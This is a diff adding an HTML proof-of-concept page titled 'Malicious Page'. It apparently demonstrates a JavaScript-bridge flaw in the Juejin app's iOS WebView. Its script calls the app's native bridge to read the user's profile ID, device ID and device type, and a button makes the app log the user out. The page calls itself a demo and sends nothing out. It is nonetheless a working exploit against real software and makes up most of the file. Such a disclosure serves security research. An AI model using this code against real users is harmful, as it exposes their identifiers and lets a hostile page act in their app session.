@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p>An attacker can steal sensitive information such as:</p>
+
+    <p style="font-size: 15px;" id="UserID">Your UserID: </p>
+    <p style="font-size: 15px;" id="DeviceID">Your DeviceID: </p>
+    <p style="font-size: 15px;" id="DeviceType">Your DeviceType: </p>
+    
+    <input type="button" value="Log out User" id="LogOutUser" style="font-size: 15px; padding: 20px 25px;"/>
+    <p style="font-size: 15px;" id="LogOutRsltText"></p>
+
+    <script>
+
+        window.JSBridge = {
+            _handleMessageFromApp: function(e) {
+                var callbackID = e.__callback_id;
+                switch (callbackID) {
+                    case "callback_app.fetch":
+                        document.getElementById("UserID").innerText = "Your UserID: " + e.__params.data.response.data.profile_id;
+                        break;
+
+                    case "callback_app.getApiParams":
+                        document.getElementById("DeviceID").innerText = "Your DeviceID: " + e.__params.data.device_id;
+                        break;
+
+                    case "callback_app.getAppInfo":
+                        // document.getElementById("UserID").innerText = "Your UserID: " + e.__params.data.user_id;
+                        document.getElementById("DeviceType").innerText = "Your DeviceType: " + e.__params.data.device_type;
+                        break;
+
+
+                    case "callback_app.logout":
+                        document.getElementById("LogOutRsltText").innerText = "Log out result: " + (e.__params.code === 1 ? "success" : "fail");
+                        
+                        
+                }
+            }
+        };
+
+        window.webkit.messageHandlers.IESPiperProtocolVersion3_0.postMessage(
+            JSON.stringify({
+                func:"app.fetch",
+                params:{"url":"https://api.juejin.cn/user_api/v1/user/profile_id","method":"GET","params":{},"needCommonParams":true},
+                JSSDK:"2.2.8",
+                __msg_type:"call",
+                __callback_id:"callback_app.fetch"
+            })
+        ); 
+
+        window.webkit.messageHandlers.IESPiperProtocolVersion3_0.postMessage(
+            JSON.stringify({
+                func:"app.getApiParams",
+                params:{"url":"https://api.juejin.cn/user_api/v1/user/profile_id","method":"GET","params":{},"needCommonParams":true},
+                JSSDK:"2.2.8",
+                __msg_type:"call",
+                __callback_id:"callback_app.getApiParams"
+            })
+        );
+
+        window.webkit.messageHandlers.IESPiperProtocolVersion3_0.postMessage(
+            JSON.stringify({
+                func:"app.getAppInfo",
+                params:{"url":"https://api.juejin.cn/user_api/v1/user/profile_id","method":"GET","params":{},"needCommonParams":true},
+                JSSDK:"2.2.8",
+                __msg_type:"call",
+                __callback_id:"callback_app.getAppInfo"
+            })
+        );
+
+        document.getElementById("LogOutUser").onclick = function () {
+            window.webkit.messageHandlers.IESPiperProtocolVersion3_0.postMessage(
+                JSON.stringify({
+                    func:"app.logout",
+                    params:{"url":"https://api.juejin.cn/user_api/v1/user/profile_id?web_id=7407059309521684005&aid=2608","method":"GET","params":{},"needCommonParams":true},
+                    JSSDK:"2.2.8",
+                    __msg_type:"call",
+                    __callback_id:"callback_app.logout"
+                })
+            );
+        }
+
+
+
+    </script>
+
+</body>
+
+</html>
